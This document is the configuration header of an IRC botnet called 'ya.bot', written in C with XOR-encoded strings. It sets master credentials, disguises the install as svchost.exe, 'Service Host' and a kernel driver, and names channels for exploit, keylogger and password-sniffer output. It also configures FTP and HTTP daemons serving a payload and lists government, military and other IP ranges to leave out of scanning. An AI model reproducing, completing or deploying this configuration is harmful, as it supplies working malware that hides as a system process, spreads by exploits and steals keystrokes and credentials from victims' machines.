/*  ya.bot  */

//-----------------------------------------------------------
//-------------CRYPTO-SETTINGS-------------------------------
//-----------------------------------------------------------

const int xorkey = //Dont change unless you want to edit all encrypted strings inside the bot.
		969;

//-----------------------------------------------------------
//-------------BOT-SETTINGS----------------------------------
//-----------------------------------------------------------

const char *botid = //B0TK1LL
		"\x8B\xF9\x9D\x82\xF8\x85\x85";
const char *botnick = //ya
		"\xB0\xA8";
const int botnickmaxrandom =
		6;
const bool botnickextended =
		TRUE;
const char *commandprefix = //.
		"\xE7";
const char *versionreply =
		"\xA4\x80\x9B\x8A\xE9\xBF\xFF\xE7\xF8\xFF\xE9\x82\xA1\xA8\xA5\xAC\xAD\xE9\x84\xA8\xBB\xAD"
		"\xA8\xA4\xE4\x8B\xAC\xB0"; //mIRC v6.16 Khaled Mardam-Bey

//-----------------------------------------------------------
//-------------USER-SETTINGS---------------------------------
//-----------------------------------------------------------

const DWORD botpassword = //hi
		1769; //ELFHASH
const char *hostauth[] =
{
		"\xE3\x89\xE3", //*@*
		NULL
};
const bool cryptedcommuncation =
		FALSE;

SUserList rgSUserList[] =
{
//master
		{121154242, //master
		1769, //hi
		"*@*", //*@*
		TRUE,
		5}, //DONT CHANGE
//guest
		{7257252, //guest
		7257252, //guest
		"*@*", //*@*
		FALSE,
		1}, //DONT CHANGE
//end
		{NULL, NULL, NULL, FALSE, 0}
};

//-----------------------------------------------------------
//-------------INSTALL-SETTINGS------------------------------
//-----------------------------------------------------------

const char *botfilename = //svchost.exe
		"\xBA\xBF\xAA\xA1\xA6\xBA\xBD\xE7\xAC\xB1\xAC";
const char *botstartupname = //Service Host
		"\x9A\xAC\xBB\xBF\xA0\xAA\xAC\xE9\x81\xA6\xBA\xBD";
const bool botinstallasservice =
		FALSE;
const char *driverfilename = //svchost.sys
		"\xBA\xBF\xAA\xA1\xA6\xBA\xBD\xE7\xBA\xB0\xBA";
const char *driverservicename = //Service Host Driver
		"\x9A\xAC\xBB\xBF\xA0\xAA\xAC\xE9\x81\xA6\xBA\xBD\xE9\x8D\xBB\xA0\xBF\xAC\xBB";
const char *wormridefilename = //svchost.dll
		"\xBA\xBF\xAA\xA1\xA6\xBA\xBD\xE7\xAD\xA5\xA5";

//-----------------------------------------------------------
//-------------CONNECTION-SETTINGS---------------------------
//-----------------------------------------------------------

SServerList rgSServerList[] =
{
//SERVER1
		{"\xF8\xFB\xFE\xE7\xF9\xE7\xF9\xE7\xF8", //127.0.0.1
		6667, //6667
		"\xF9\xBE\xA7", //0wn
		"\xEA\xB0\xA8\xAB\xA6\xBD", //#yabot
		"\xAB\xF9\xBD", //b0t
		"\xEA\xB0\xA8\xAB\xA6\xBD\xE4\xAC\xB1\xB9\xA5\xA6\xA0\xBD", //#yabot-exploit
		"\xEA\xB0\xA8\xAB\xA6\xBD\xE4\xA2\xAC\xB0\xA5\xA6\xAE", //#yabot-keylog
		"\xEA\xB0\xA8\xAB\xA6\xBD\xE4\xB9\xBA\xA7\xA0\xAF\xAF", //#yabot-psniff
		2000, //2000
		4000, //4000
		120000}, //120000
//END
		{NULL, 0, NULL, NULL, NULL, NULL, NULL, NULL, 0, 0, 0}
};

//-----------------------------------------------------------
//-------------DAEMON-SETTINGS-------------------------------
//-----------------------------------------------------------

const int daemonftpport =
		2468;
const char *daemonftpuser = //yabot
		"\xB0\xA8\xAB\xA6\xBD";
const char *daemonftppass = //tobay
		"\xBD\xA6\xAB\xA8\xB0";
const char *daemonhttpfilename = //me.scr
		"\xA4\xAC\xE7\xBA\xAA\xBB";
const int daemonhttpport =
		2469;

//-----------------------------------------------------------
//-------------OTHER-SETTINGS--------------------------------
//-----------------------------------------------------------

const char *debuglogfilename = //yalog.log
		"\xB0\xA8\xA5\xA6\xAE\xE7\xA5\xA6\xAE";
const char *badipsandhosts[] =
{
		"\xE3\xE7\xAE\xA6\xBF", //*.gov
		"\xE3\xE7\xA4\xA0\xA5", //*.mil
		"\xFF\xE7\xE3", // 6.* Army Information Systems Center 
		"\xFE\xE7\xE3", // 7.*
		"\xF8\xF8\xE7\xE3", // 11.*
		"\xFB\xF8\xE7\xE3", // 21.*
		"\xFB\xFB\xE7\xE3\xE9", // 22.*
		"\xFB\xFC\xE7\xE3\xE9", // 25.*
		"\xFB\xFD\xE7\xF8\xF0\xF1\xE7\xE3", // 24.198.*
		"\xFB\xFF\xE7\xE3", // 26.*
		"\xFB\xF0\xE7\xE3", // 29.*
		"\xFA\xF9\xE7\xE3", // 30*
		"\xFD\xF0\xE7\xE3\xE9", // 49.*
		"\xFC\xF9\xE7\xE3\xE9", // 50.*
		"\xFC\xFC\xE7\xE3\xE9", // 55.*
		"\xFF\xFB\xE7\xE3\xE9", // 62.*
		"\xFF\xFD\xE7\xFE\xF9\xE7\xE3", // 64.70.*
		"\xFF\xFD\xE7\xFB\xFB\xFD\xE7\xE3\xE9", // 64.224.*
		"\xFF\xFD\xE7\xFB\xFB\xFC\xE7\xE3\xE9", // 64.225.*
		"\xFF\xFD\xE7\xFB\xFB\xFF\xE7\xE3\xE9", // 64.226.*
		"\xF8\xFB\xF1\xE7\xE3", // 128.* alot of edus but alot of bad stuff also.
		"\xF8\xFB\xF0\xE7\xE3", // 129.*
		"\xF8\xFA\xF9\xE7\xE3", // 130.*
		"\xF8\xFA\xF8\xE7\xE3", // 131.*
		"\xF8\xFA\xFB\xE7\xE3", // 132.*
		"\xF8\xFA\xFD\xE7\xE3", // 134.*
		"\xF8\xFA\xFF\xE7\xE3", // 136.*
		"\xF8\xFA\xFE\xE7\xE3", // 137.*
		"\xF8\xFA\xF1\xE7\xE3", // 138.*
		"\xF8\xFA\xF0\xE7\xE3", // 139.*
		"\xF8\xFD\xF9\xE7\xE3", // 140.*
		"\xF8\xFD\xFA\xE7\xE3", // 143.*
		"\xF8\xFD\xFD\xE7\xE3", // 144.*
		"\xF8\xFD\xFF\xE7\xE3", // 146.*
		"\xF8\xFD\xFE\xE7\xE3", // 147.*
		"\xF8\xFD\xF1\xE7\xE3", // 148.*
		"\xF8\xFC\xF9\xE7\xE3", // 150.*
		"\xF8\xFC\xFB\xE7\xE3", // 152.*
		"\xF8\xFC\xFA\xE7\xE3", // 153.*
		"\xF8\xFC\xFC\xE7\xE3", // 155.*
		"\xF8\xFC\xFF\xE7\xE3", // 156.*
		"\xF8\xFC\xFE\xE7\xE3", // 157.*
		"\xF8\xFC\xF1\xE7\xE3", // 158.*
		"\xF8\xFC\xF0\xE7\xE3", // 159.*
		"\xF8\xFF\xF9\xE7\xE3", // 160.*
		"\xF8\xFF\xF8\xE7\xE3", // 161.*
		"\xF8\xFF\xFB\xE7\xE3", // 162.*
		"\xF8\xFF\xFA\xE7\xE3", // 163.*
		"\xF8\xFF\xFD\xE7\xE3", // 164.*
		"\xF8\xFF\xFE\xE7\xE3", // 167.*
		"\xF8\xFF\xF1\xE7\xE3", // 168.*
		"\xF8\xFF\xF0\xE7\xE3", // 169.*
		"\xF8\xF0\xFD\xE7\xE3", // 194.*
		"\xF8\xF0\xFC\xE7\xF8\xF9\xE7\xE3\xE9", // 195.10.*
		"\xF8\xF0\xF0\xE7\xE3", // 199.*
		"\xFB\xF9\xFA\xE7\xFC\xF0\xE7\xE3", // 203.59.*
		"\xFB\xF9\xFD\xE7\xF8\xF8\xFE\xE7\xE3", //204.117.*
		"\xFB\xF9\xFD\xE7\xFA\xFD\xE7\xE3", // 204.34.*
		"\xFB\xF9\xFC\xE7\xE3", // 205.*
		"\xFB\xF9\xFE\xE7\xE3", // 207.*
		"\xFB\xF9\xF1\xE7\xFB\xFD\xF9\xE7\xE3", // 208.240.*
		"\xFB\xF9\xF0\xE7\xFA\xFC\xE7\xE3", // 209.35.*
		"\xFB\xF8\xFB\xE7\xFC\xFF\xE7\xE3", // 212.56.*
		"\xFB\xF8\xFB\xE7\xF8\xFD\xFA\xE7\xE3", // 212.143.*
		"\xFB\xF8\xFB\xE7\xF8\xFD\xF0\xE7\xE3", // 212.149.*
		"\xFB\xF8\xFB\xE7\xF8\xFC\xF0\xE7\xE3", // 212.159.*
		"\xFB\xF8\xFB\xE7\xF8\xFE\xF0\xE7\xE3", // 212.179.*
		"\xFB\xF8\xFB\xE7\xFB\xF9\xF1\xE7\xE3", // 212.208.*
		"\xFB\xF8\xFA\xE7\xF1\xE7\xE3", // 213.8.*
		"\xFB\xF8\xFE\xE7\xFF\xE7\xE3", // 217.6.*
		NULL
};